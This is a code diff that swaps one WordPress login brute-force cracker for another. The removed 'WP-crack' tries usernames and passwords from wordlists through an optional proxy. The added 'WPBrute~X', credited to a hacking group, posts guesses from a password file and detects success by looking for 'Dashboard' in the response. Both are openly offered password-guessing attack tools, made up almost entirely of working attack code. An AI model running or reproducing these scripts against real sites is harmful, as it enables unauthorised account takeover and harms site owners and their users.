@@ -1,243 +1,104 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+import os
 import sys
-import urllib2, urllib
-import cookielib
-import re
- 
-#
-#functions
-#
- 
-def loadLst(fileName, lstName):
-    f = open(fileName, 'r')
-    for line in f:
-        lstName.append(line.replace('\r\n',''))
-    f.close()
- 
-if len(sys.argv) <= 1:
-    print 'WP-crack v1.0 (c)2012 by D704T - a very fast logon WordPress Cracker'
-    print 'Website: http://www.sainsbyte.com'
-    print 'Mail   : jay.hutajulu11@gmail.com'
-    print ''
-    print 'Syntax: python WP-crack [-u USER|-U FILE] [-p PASS|-P FILE] -h URL [OPT]'
-    print ''
-    print 'Options:'
-    print '-h URL'
-    print '-U file contain list user'
-    print '-P file contain list password'
-    print '-u username'
-    print '-p password'
-    print '-v verbose mode / show login+pass combination for each attempt'
-    print '-f continue after found login/password pair'
-    print '-g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"'
-    print '-x use proxy | ex: 127.0.0.1:1234'
-    print ''
-    print 'Examples: python wpbrute.py -h http://test.com/wp-login.php -u admin -P password.txt'
-    sys.exit()
- 
-print 'WP-crack 1.0 (c)2019 by D704T - a very fast logon WordPress Cracker'
-print 'Website: http://www.sainsbyte.com'
-print 'Mail   : jay.hutajulu11@gmail.com'
- 
-#
-#define variables
-#
- 
-print ""
- 
-url = ''
-wordlist = ''
-username = ''
-password = ''
-passFile = ''
-userFile = ''
-signal = 'type="password"'
-count = 0
-countAcc = 0
-mode = 1
-verbose = 0
-useProxy = 0
-continues = 0
-agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
-result = ""
- 
- 
-#
-#check argvs
-#
-for arg in sys.argv:
-    if arg == '-h':
-        url = sys.argv[count + 1]
-    elif arg == '-u':
-        username = sys.argv[count + 1]
-    elif arg == '-U':
-        userFile = sys.argv[count + 1]
-    elif arg == '-p':
-        password = sys.argv[count + 1]
-    elif arg == '-P':
-        passFile = sys.argv[count + 1]
-    elif arg == '-v':
-        verbose = 1
-    elif arg == '-s':
-        signal = sys.argv[count + 1]
-    elif arg == '-g':
-        agent = sys.argv[count + 1]
-    elif arg == '-x':
-        lstTmp = sys.argv[count+1].split(':')
-        proxyHandler = urllib2.ProxyHandler({lstTmp[0] : lstTmp[1]+':'+lstTmp[2]})
-        useProxy = 1
-    elif arg == '-f':
-        continues = 1
-    count += 1
- 
- 
-if (len(username)>0 and len(password)>0):
-    mode = 1 #single
-elif (len(username)>0 and len(passFile)>0):
-    mode = 2 #
-elif (len(userFile)>0 and len(password)>0):
-    mode = 3
-elif (len(userFile)>0 and len(passFile)>0):
-    mode = 4
- 
-#
-#init opener
-#
-cookieJar = cookielib.CookieJar()
-cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
-if useProxy == 0:
-    opener = urllib2.build_opener(cookieHandler)
-else:
-    opener = urllib2.build_opener(proxyHandler,cookieHandler)
-opener.addheaders = [('User-agent', agent)]
-cookieJar.clear()
-cookieJar.clear_session_cookies()
- 
-#
-#main
-#
-try:
-    response = opener.open(url)
-    content = response.read()
-    if mode == 1:
-        values = {'log' : username,
-                      'pwd' : password,
-                      'wp-submit' : 'Log In',
-                      'redirect_to' : '',
-                      'testcookie' : '1' }
-        data = urllib.urlencode(values)
-        print data
-        response = opener.open(url+'/', data)
-        strTmp = response.read()
-        if strTmp.find(signal) < 0:
-            countAcc += 1
-            result += "username: " + username + "   password: " + password + "\n"
-            print "Valid user--pass: " + username + " -- " + password
-            f3 = open('test.html','w')
-            f3.write(strTmp)
-            f3.close()  
-           
+import random
+import requests
+R = '\033[31m'   # Red
+N = '\033[1;37m' # White
+G = '\033[32m'   # Green
+O = '\033[0;33m' # Orange
+B = '\033[1;34m' # Blue
+C = '\033[36m' # cyan
+def banner():
+	print ("""
+\033[1;34m
+ _______ ______    _________
+        |              
+       / \
+      / _ \
+     |.o '.|
+     |'._.'|
+     |     |
+   ,'|  |  |`.
+  /  |  |  |  \
+  |,-'--|--'-.| l42
+
+Codename : \033[32mWPBrute~X
+\033[1;34mCoded BY : \033[32mKyuRazz ~ Family Attack Cyber
+\033[1;34mVersion  : \033[32m1.0
+Thanks To : Dann ~ Aalex ~ Faisal ~ Ago Oeng 
+
+    """)
+
+class a:
+
+	def __init__(self):
+		self.username = input("  [\033[36m*\033[32m] Username => ")
+		self.password = input("  [\033[36m*\033[32m] File Password => ")
+		self.code = ('jtc')
+		self.url = input("  [\033[36m*\033[32m] Your URL => ")
+		self.headers = {'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414',
+					   'Accept': 'application/x-www-form-urlencoded',
+					   'Cookie': 'wordpress_test_cookie=WP Cookie check'
+
+					   }
+		
+		self.proxi = [
+'http://78.160.160.70',
+'http://95.239.10.204',
+'http://205.202.42.230',
+'http://186.148.168.91',
+'http://113.252.222.73',
+'http://203.107.135.125',
+'http://80.48.119.28',
+'http://159.203.20.110',
+'http://178.128.153.253',
+'http://104.248.123.136',
+'http://157.230.149.54'
+
    
-   
-    if mode == 2:
-        f = open(passFile,'r')
-        for line in f:            
-            password = line.strip('\n\r')
-            values = {'log' : username,
-                      'pwd' : password,
-                      'wp-submit' : 'Log In',
-                      'redirect_to' : '',
-                      'testcookie' : '1' }
-            if verbose == 1:
-                print "Trying u--p     : " + username + " -- " + password            
-            data = urllib.urlencode(values)
-            try:
-                response = opener.open(url+'/', data)
-            except urllib2.URLError, e:
-                continue
-            strTmp = response.read()
-            if strTmp.find(signal) < 0:
-                countAcc += 1
-                result += "username: " + username + "   password: " + password + "\n"
-                print "Valid user--pass: " + username + " -- " + password                
-                break;
-         
- 
- 
-    if mode == 3:
-        f = open(userFile,'r')
-        for line in f:
-            username = line.strip('\n\r')
-            values = {'log' : username,
-                      'pwd' : password,
-                      'wp-submit' : 'Log In',
-                      'redirect_to' : '',
-                      'testcookie' : '1' }
-            if verbose == 1:
-                print "Trying u--p     : " + username + " -- " + password
-            data = urllib.urlencode(values)
-            try:
-                response = opener.open(url+'/', data)
-            except urllib2.URLError, e:
-                continue
-            strTmp = response.read()
-            if strTmp.find(signal) < 0:
-                countAcc += 1                
-                result += "username: " + username + "   password: " + password + "\n"
-                print "Valid user--pass: " + username + " -- " + password                
-                if continues == 0:
-                    break
-                cookieJar.clear()
-                cookieJar.clear_session_cookies()
-                response = opener.open(url)
-                content = response.read()
- 
-               
-       
-    if mode == 4:
-        f = open(userFile,'r')
-        f2 = open(passFile,'r')
-        for line in f:
-            username = line.strip('\n\r')
-            f2.seek(0)
-            for line2 in f2:
-                password = line2.strip('\n\r')
-                values = {'log' : username,
-                      'pwd' : password,
-                      'wp-submit' : 'Log In',
-                      'redirect_to' : '',
-                      'testcookie' : '1' }
-                if verbose == 1:
-                    print "Trying u--p     : " + username + " -- " + password
-                data = urllib.urlencode(values)
-                try:
-                    response = opener.open(url+'/', data)
-                except urllib2.URLError, e:
-                    continue
-                strTmp = response.read()
-                if strTmp.find(signal) < 0:
-                    countAcc += 1                    
-                    result += "username: " + username + "   password: " + password + "\n"
-                    print "Valid user--pass: " + username + " -- " + password                    
-                    if continues == 0:
-                        break;
-                    cookieJar.clear()
-                    cookieJar.clear_session_cookies()
-                    response = opener.open(url)
-                    content = response.read()
-                   
-        f.close()
-        f2.close()    
-       
-    #Finish
-    print ''      
-    print '1 target successfuly completed, '+ str(countAcc) +' valid username+password found'
-    print 'TARGER: ' + url
-    print 'RESULT:'        
-    print result
-    sys.exit()
-except urllib2.URLError, e:
-    print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
-except (KeyboardInterrupt):
-    print "\n\t[!] Session cancelled"
+]
+
+	def brute(self):
+		self.nani = open(self.password, 'r').readlines()
+		self.mani = open(self.password, 'r').readlines()
+		self.testing = requests.get(self.url).text
+		self.random = random.choice(self.proxi)
+		ha = {'http':self.random}
+		try:
+			if 'Hover or click the text box below' in self.testing:
+				print ("  [\033[36m*\033[32m] ADA PERTANYAAN GAN [\033[36m*\033[32m]")
+				for i in self.nani:
+					yeah = i.strip()
+					self.datadata = {'log':self.username,'pwd':yeah,'reference':self.code}
+					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
+					hetset = (jebol).text
+					if 'Dashboard' in hetset:
+						print("\033[32m[SUKSES] {}" .format(yeah))
+					else:
+						print("\033[GAGAL] [31m{}" .format(yeah))
+			else:
+				print("  [\033[36m*\033[32m] NO ANSWER [\033[36m*\033[32m]")
+				for z in self.mani:
+					yeahmen = z.strip()
+					self.datadata = {'log':self.username,'pwd':yeahmen}
+					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
+					kento = (jebol).text
+					if 'Dashboard' in kento:
+						print("\033[32m[SUKSES] \033[32m{} ".format(yeahmen))
+					else:
+						print("\033[31m[GAGAL] {}" .format(yeahmen) )
+
+		except KeyboardInterrupt:
+			print ("CTRL+C")
+
+
+
+
+
+		
+
+if __name__ == "__main__":
+	os.system('clear')
+	banner()
+	mi = a()
+	mi.brute()
